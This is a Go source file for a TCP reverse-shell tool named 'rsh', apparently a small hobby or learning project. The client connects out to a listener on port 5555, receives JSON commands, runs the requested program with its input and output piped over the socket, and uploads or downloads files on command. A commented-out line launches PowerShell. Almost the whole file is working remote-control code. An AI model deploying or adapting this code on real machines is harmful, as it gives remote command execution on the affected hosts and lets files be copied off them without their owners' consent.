package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"os"
	"strings"

	"github.com/mang0kitty/tcpReverseShell/rsh"

	"github.com/urfave/cli/v2"
)

/**
S: start listening
S: wait for a client

-- s.Listen()

C: connect to the server
C: send "hello" to the server

-- c.Connect()
-- c.Send("hello")

S: receive "hello" from the client
S: send "hello" back to the client

-- d := s.Receive()
-- s.Send(d)

C: close
S: close
-- c.Close()
-- s.Close()
*/

func startServer(c *cli.Context) error {
	addr := c.String("addr")
	fmt.Printf("Listening on %s\n", addr)
	tcp, err := rsh.NewTCPServer(addr)
	if err != nil {
		return err
	}
	defer tcp.Close()
	cmd := &Command{
		Type:      c.Args().First(),
		Arguments: c.Args().Slice()[1:],
		//Arguments: []string{"powershell.exe", "-NoExit", "-Command", "Write-Host 'Instruction Received'"},
	}

	switch cmd.Type {
	case "app":
	case "upload":
	case "download":
	case "exit":
	default:
		log.Fatal("Unknown command received")
	}

	//instruction := "powershell.exe"
	//tcp.Send([]byte(instruction))

	json.NewEncoder(tcp).Encode(cmd)

	switch cmd.Type {
	case "app":
		// TODO: handle errors by shutting down the server + client
		go func() {
			io.Copy(tcp, os.Stdin)
		}()
		_, err = io.Copy(os.Stdout, tcp)
	case "upload":
		Download("rsh/hello.txt", tcp)
	case "download":
		Upload("rsh/hello.txt", tcp)
	case "exit":
	default:
		log.Fatal("Unknown command received")
	}

	return err
}

type Command struct {
	Type      string   `json:"type"`
	Arguments []string `json:"args"`
}

// CmdType: app, download, upload, exit

func startClient(c *cli.Context) error {
	addr := c.String("addr")
	fmt.Printf("Client connecting to %s\n", addr)
	tcp, err := rsh.NewTCPClient(addr)
	if err != nil {
		return err
	}

	defer tcp.Close()

	cmd := &Command{}
	json.NewDecoder(tcp).Decode(&cmd)

	switch cmd.Type {
	case "app":
		ps := rsh.AppRunner{
			Stdin:  tcp,
			Stdout: tcp,
		}
		err = ps.Execute(cmd.Arguments[0], cmd.Arguments[1:]...)
		if err != nil {
			log.Fatal(err)
		}
	case "return":
		return nil
	case "upload":
		err = Upload(cmd.Arguments[0], tcp)
		if err != nil {
			log.Fatal(err)
		}
	case "download":
		err = Download(cmd.Arguments[0], tcp)
		if err != nil {
			log.Fatal(err)
		}
	default:
		fmt.Println("Unrecognized Command Type %s\n", cmd.Type)
	}

	if err != nil {
		log.Fatal(err)
	}

	return nil
}

func Download(fileName string, conn rsh.Transport) error {
	file, err := os.OpenFile(strings.TrimSpace(fileName), os.O_CREATE, os.ModePerm)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	_, err = io.Copy(file, conn)
	if err != nil {
		log.Fatal(err)
	}

	return nil
}

func Upload(fileName string, conn rsh.Transport) error {
	file, err := os.Open(fileName)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	_, err = io.Copy(conn, file)
	if err != nil {
		log.Fatal(err)
	}

	return nil
}

func main() {
	app := &cli.App{
		Name: "rsh",

		Commands: []*cli.Command{
			&cli.Command{
				Name:  "server",
				Usage: "Runs an rsh server.",
				Flags: []cli.Flag{
					&cli.StringFlag{
						Name:  "addr",
						Value: "0.0.0.0:5555",
						Usage: "The address to listen on.",
					},
					&cli.StringFlag{
						Name:  "run",
						Value: "",
						Usage: "Specify a program to run on clients which connect to the server.",
					},
				},
				Action: startServer,
			},
			&cli.Command{
				Name:  "client",
				Usage: "Runs an rsh client.",
				Flags: []cli.Flag{
					&cli.StringFlag{
						Name:  "addr",
						Value: "127.0.0.1:5555",
						Usage: "the server to connect to",
					},
				},
				Action: startClient,
			},
		},
	}

	err := app.Run(os.Args)
	if err != nil {
		log.Fatal(err)
	}
}
